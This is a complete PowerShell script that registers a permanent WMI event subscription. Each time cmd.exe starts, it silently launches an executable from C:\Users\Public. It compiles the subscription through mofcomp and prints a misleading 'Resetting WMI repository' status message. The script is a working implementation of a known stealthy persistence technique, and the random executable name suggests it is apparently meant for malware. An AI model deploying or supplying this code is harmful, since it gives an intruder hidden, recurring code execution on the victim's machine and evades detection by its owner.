# 1. Admin Check
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "Please run as Administrator."; break
}

$ExePath = "C:\Users\Public\c723561.exe"
$Name = "CmdTrigger"
$Sub = "root\subscription"

Write-Host "Resetting WMI repository..." -ForegroundColor Yellow

# 2. Cleanup PowerShell's previous attempts
Get-CimInstance -Namespace $Sub -ClassName __EventFilter -Filter "Name='$($Name)_Filter'" | Remove-CimInstance -ErrorAction SilentlyContinue
Get-CimInstance -Namespace $Sub -ClassName CommandLineEventConsumer -Filter "Name='$($Name)_Consumer'" | Remove-CimInstance -ErrorAction SilentlyContinue
Get-CimInstance -Namespace $Sub -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq "$($Name)_Filter" } | Remove-CimInstance -ErrorAction SilentlyContinue

Start-Sleep -Seconds 1

# 3. Generate the MOF syntax
# MOF requires backslashes to be escaped, so C:\ becomes C:\\
$EscapedExe = $ExePath -replace '\\', '\\'

$MofContent = @"
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as `$Filter
{
    Name = "$($Name)_Filter";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'cmd.exe'";
    EventNamespace = "root\\cimv2";
};

instance of CommandLineEventConsumer as `$Consumer
{
    Name = "$($Name)_Consumer";
    ExecutablePath = "$EscapedExe";
    CommandLineTemplate = "\"$EscapedExe\"";
};

instance of __FilterToConsumerBinding
{
    Filter = `$Filter;
    Consumer = `$Consumer;
};
"@

# 4. Save to a temporary file
$MofPath = "$env:TEMP\CmdTriggerSetup.mof"
$MofContent | Out-File -FilePath $MofPath -Encoding ASCII

Write-Host "Compiling MOF file natively..." -ForegroundColor Cyan

# 5. Compile using Windows' built-in MOF compiler
& mofcomp.exe $MofPath

# 6. Clean up the temp file
Remove-Item $MofPath -ErrorAction SilentlyContinue

Write-Host "Registration Complete. Type mismatch bypassed!" -ForegroundColor Green
